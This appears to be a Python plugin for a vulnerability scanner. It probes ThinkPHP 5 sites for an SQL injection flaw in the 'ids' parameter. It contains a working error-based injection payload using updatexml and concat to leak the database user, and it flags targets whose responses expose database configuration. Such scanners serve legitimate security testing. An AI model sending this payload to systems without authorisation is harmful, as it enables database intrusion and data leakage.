#!/usr/bin/env python3
# -*- coding:utf-8 -*-

thinkphp_5_ids_sqlinject_payloads = [
    {'path': 'index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'},
]

def _5_ids_sqlinject_scan(self, clients):
    ''' ThinkPHP5 SQL注入漏洞&&敏感信息泄露漏洞 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'SQLinject',
        'vul_id': 'thinkphp-5-ids-sqlinject',
    }

    for payload in thinkphp_5_ids_sqlinject_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('XPATH syntax error' in res.text) and ('Database Config' in res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
